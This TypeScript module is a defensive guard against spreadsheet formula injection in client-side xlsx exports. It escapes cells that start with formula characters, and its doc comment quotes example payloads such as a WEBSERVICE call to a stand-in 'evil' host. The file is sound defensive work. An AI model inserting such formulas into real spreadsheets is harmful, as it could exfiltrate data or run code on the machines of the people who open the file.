import * as XLSX from 'xlsx';

/**
 * Spreadsheet formula-injection guard for CLIENT-SIDE xlsx generation.
 *
 * A cell value beginning with `= + - @` (or a leading tab/CR) is interpreted as a
 * live formula by Excel / Google Sheets — a tenant/user-supplied value like
 * `=WEBSERVICE("http://evil")` or `=cmd()` would execute when someone opens the
 * downloaded file. Prefixing with an apostrophe forces text. Idempotent: an
 * already-escaped `'=x` does not match and is left unchanged. Mirrors the backend
 * `cellSafe` in `api/src/common/xlsx.ts`.
 *
 * EVERY FE export that builds a workbook (the `lib/*-export.ts` helpers + inline
 * page downloads) must route its sheet construction through `aoaToSheetSafe` /
 * `jsonToSheetSafe` (or cellSafe its cells) so no client-generated download can be
 * an injection sink. Reading/parsing uploads (`XLSX.read`) is unaffected.
 */
export function cellSafe(v: string): string {
  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
}

/** cellSafe every string cell of an array-of-arrays, then aoa_to_sheet. */
export function aoaToSheetSafe(rows: unknown[][]): XLSX.WorkSheet {
  const safe = rows.map((r) => r.map((c) => (typeof c === 'string' ? cellSafe(c) : c)));
  return XLSX.utils.aoa_to_sheet(safe);
}

/** cellSafe every string cell of row-objects, then json_to_sheet. */
export function jsonToSheetSafe(rows: Record<string, unknown>[]): XLSX.WorkSheet {
  const safe = rows.map((row) => {
    const out: Record<string, unknown> = {};
    for (const [k, val] of Object.entries(row)) {
      out[k] = typeof val === 'string' ? cellSafe(val) : val;
    }
    return out;
  });
  return XLSX.utils.json_to_sheet(safe);
}
